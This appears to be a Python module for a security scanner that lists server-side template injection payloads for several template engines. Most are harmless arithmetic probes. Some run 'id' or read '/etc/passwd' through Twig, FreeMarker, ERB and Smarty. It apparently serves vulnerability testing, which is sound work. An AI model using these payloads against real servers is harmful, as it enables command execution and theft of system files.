"""Extended SSTI payloads for various template engines."""

SSTI_PAYLOADS = [
    # Jinja2 / Django
    '{{7*7}}',
    '{{config}}',
    '{{self._TemplateReference__context}}',
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    
    # Twig / PHP
    '{{7*7}}',
    '{{_self.env.registerUndefinedFilterCallback("exec")}}',
    '{{_self.env.getFilter("cat /etc/passwd")}}',
    
    # FreeMarker / Java
    '${7*7}',
    '${7*7}',
    '${"freemarker.template.utility.Execute"?new()("id")}',
    
    # ERB / Ruby
    '<%= 7*7 %>',
    '<%= system("id") %>',
    '<%= File.open("/etc/passwd").read %>',
    
    # Velocity / Java
    '#set($x=7*7)$x',
    '#set($x=$class.inspect)$x',
    
    # Smarty / PHP
    '{7*7}',
    '{system("id")}',
    '{php}echo "test";{/php}',
    
    # Generic
    '${7*7}',
    '#{7*7}',
    '*{7*7}',
]

FRAMEWORK_SSTI_PAYLOADS = {
    "jinja2": [
        '{{7*7}}',
        '{{"".__class__}}',
    ],
    "django": [
        '{{7*7}}',
        '{{request.user}}',
    ],
    "twig": [
        '{{7*7}}',
    ],
    "freemarker": [
        '${7*7}',
    ],
}


def get_ssti_payloads(framework: str | None = None) -> list[str]:
    """Get SSTI payloads, optionally filtered by framework."""
    payloads = list(SSTI_PAYLOADS)
    if framework and framework.lower() in FRAMEWORK_SSTI_PAYLOADS:
        payloads.extend(FRAMEWORK_SSTI_PAYLOADS[framework.lower()])
    return payloads
